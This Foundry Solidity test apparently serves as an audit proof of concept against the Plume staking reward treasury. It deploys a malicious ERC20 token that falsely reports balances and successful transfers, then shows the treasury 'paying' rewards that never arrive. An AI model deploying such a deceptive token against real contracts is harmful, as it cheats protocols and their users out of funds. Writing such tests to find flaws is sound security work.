// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import core Plume system
//import {Plume} from "src/Plume.sol";
import {PlumeStakingRewardTreasury} from "src/PlumeStakingRewardTreasury.sol";
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";
import {IPlumeStakingRewardTreasury} from "src/interfaces/IPlumeStakingRewardTreasury.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import { IAccessControl } from "src/interfaces/IAccessControl.sol";

import {ISolidStateDiamond} from "@solidstate/proxy/diamond/ISolidStateDiamond.sol";
import { IERC2535DiamondCutInternal } from "@solidstate/interfaces/IERC2535DiamondCutInternal.sol";
import { PlumeStakingRewardTreasuryProxy } from "src/proxy/PlumeStakingRewardTreasuryProxy.sol";

// ERC20 interface
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// --- Malicious Token ---
contract MaliciousERC20 is IERC20 {
    string public constant name = "EvilToken";
    string public constant symbol = "EVIL";
    uint8 public constant decimals = 18;
    address immutable i_treasury;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    constructor(address _treasury) {
        i_treasury = _treasury;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == i_treasury) {
            return 1_000_000 ether;
        }
        return balances[address(account)];
    }

    function transfer(address, uint256) external pure override returns (bool) {
        return true; // lie
    }

    function transferFrom(address, address, uint256) external pure override returns (bool) {
        return true; // lie
    }

    function approve(address, uint256) external pure override returns (bool) {
        return true;
    }

    function allowance(address, address) external pure override returns (uint256) {
        return 1_000_000 ether;
    }

    function totalSupply() external pure override returns (uint256) {
        return 1_000_000 ether;
    }
}

// --- Test ---
contract RewardExploitTest is Test {
    MaliciousERC20 evilToken;
    address payable evilPayable;

    // Diamond Proxy Address
    PlumeStaking internal diamondProxy;
    PlumeStakingRewardTreasury public treasury;

    // Addresses
    address public constant ADMIN_ADDRESS = 0xC0A7a3AD0e5A53cEF42AB622381D0b27969c4ab5;

    address public admin;

    // Constants
    uint256 public constant MIN_STAKE = 1e17; // 0.1 PLUME for stress testing
    uint256 public constant INITIAL_COOLDOWN = 7 days; // Keep real cooldown

    function setUp() public {
        console2.log("Starting Test setup");

        admin = ADMIN_ADDRESS;

        vm.deal(admin, 10_000 ether); // Ensure admin has funds

        vm.startPrank(admin);

        // 1. Deploy Diamond Proxy
        diamondProxy = new PlumeStaking();
        assertEq(
            ISolidStateDiamond(payable(address(diamondProxy))).owner(), admin, "Deployer should be owner initially"
        );

        // 2. Deploy Custom Facets
        AccessControlFacet accessControlFacet = new AccessControlFacet();
        //StakingFacet stakingFacet = new StakingFacet();
        RewardsFacet rewardsFacet = new RewardsFacet();
        //ValidatorFacet validatorFacet = new ValidatorFacet();
        //ManagementFacet managementFacet = new ManagementFacet();

        // 3. Prepare Diamond Cut
        IERC2535DiamondCutInternal.FacetCut[] memory cut = new IERC2535DiamondCutInternal.FacetCut[](2); // 5

        // --- Get Selectors (using helper or manual list) ---
        bytes4[] memory accessControlSigs = new bytes4[](7);
        accessControlSigs[0] = AccessControlFacet.initializeAccessControl.selector;
        accessControlSigs[1] = IAccessControl.hasRole.selector;
        accessControlSigs[2] = IAccessControl.getRoleAdmin.selector;
        accessControlSigs[3] = IAccessControl.grantRole.selector;
        accessControlSigs[4] = IAccessControl.revokeRole.selector;
        accessControlSigs[5] = IAccessControl.renounceRole.selector;
        accessControlSigs[6] = IAccessControl.setRoleAdmin.selector;

        bytes4[] memory rewardsSigs = new bytes4[](15);
        rewardsSigs[0] = RewardsFacet.addRewardToken.selector;
        rewardsSigs[1] = RewardsFacet.removeRewardToken.selector;
        rewardsSigs[2] = RewardsFacet.setRewardRates.selector;
        rewardsSigs[3] = RewardsFacet.setMaxRewardRate.selector;
        rewardsSigs[4] = bytes4(keccak256("claim(address)"));
        rewardsSigs[5] = bytes4(keccak256("claim(address,uint16)"));
        rewardsSigs[6] = RewardsFacet.claimAll.selector;
        rewardsSigs[7] = RewardsFacet.earned.selector;
        rewardsSigs[8] = RewardsFacet.getClaimableReward.selector;
        rewardsSigs[9] = RewardsFacet.getRewardTokens.selector;
        rewardsSigs[10] = RewardsFacet.getMaxRewardRate.selector;
        rewardsSigs[11] = RewardsFacet.tokenRewardInfo.selector;
        rewardsSigs[12] = RewardsFacet.setTreasury.selector;
        rewardsSigs[13] = RewardsFacet.getPendingRewardForValidator.selector;

        // Define the Facet Cuts
        cut[0] = IERC2535DiamondCutInternal.FacetCut({
            target: address(accessControlFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: accessControlSigs
        });
        cut[1] = IERC2535DiamondCutInternal.FacetCut({
            target: address(rewardsFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: rewardsSigs
        });

        // 4. Execute Diamond Cut
        ISolidStateDiamond(payable(address(diamondProxy))).diamondCut(cut, address(0), "");
        console2.log("Diamond cut applied.");

        // 5. Initialize
        diamondProxy.initializePlume(
            address(0),
            MIN_STAKE,
            INITIAL_COOLDOWN,
            1 days, // maxSlashVoteDuration
            50e16 // maxAllowedValidatorCommission (50%)
        );
        AccessControlFacet(address(diamondProxy)).initializeAccessControl();
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.ADMIN_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, admin); // Grant reward manager
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.TIMELOCK_ROLE, admin);
        console2.log("Diamond initialized.");

        // 6. Deploy and setup reward treasury
        PlumeStakingRewardTreasury treasuryImpl = new PlumeStakingRewardTreasury();
        bytes memory initData = abi.encodeWithSelector(PlumeStakingRewardTreasury.initialize.selector, admin, address(diamondProxy));
        PlumeStakingRewardTreasuryProxy treasuryProxy = new PlumeStakingRewardTreasuryProxy(address(treasuryImpl), initData);
        treasury = PlumeStakingRewardTreasury(payable(address(treasuryProxy)));
        RewardsFacet(address(diamondProxy)).setTreasury(address(treasury));
        console2.log("Treasury deployed and set.");

        // Deploy evil token
        evilToken = new MaliciousERC20(address(treasury)); // attacker knows the address of deployed treasury contract
        evilPayable = payable(address(evilToken)); // Payable for treasury funding

        // 8. Add EVIL as the only reward token
        RewardsFacet(address(diamondProxy)).addRewardToken(evilPayable, 1 ether, 2 ether);
        treasury.addRewardToken(evilPayable); // Also add to treasury allowed list
        vm.deal(address(treasury), 1_000_000 ether); // Give treasury a large amount of native ETH for rewards
        console2.log("EVIL reward token added and treasury funded.");

        vm.stopPrank();
        console2.log("Test setup complete.");
    }

    function testMaliciousTokenFoolsRewardTreasury() public {
        address user = makeAddr("user");

        // Ensure user starts with zero
        assertEq(evilToken.balanceOf(user), 0);

        // Admin sends reward
        console2.log("Distribute reward.");
        vm.prank(address(diamondProxy));
        treasury.distributeReward(evilPayable, 1 ether, user);

        // Check user still has zero
        assertEq(evilToken.balanceOf(user), 0, "User received no tokens");
    }
}
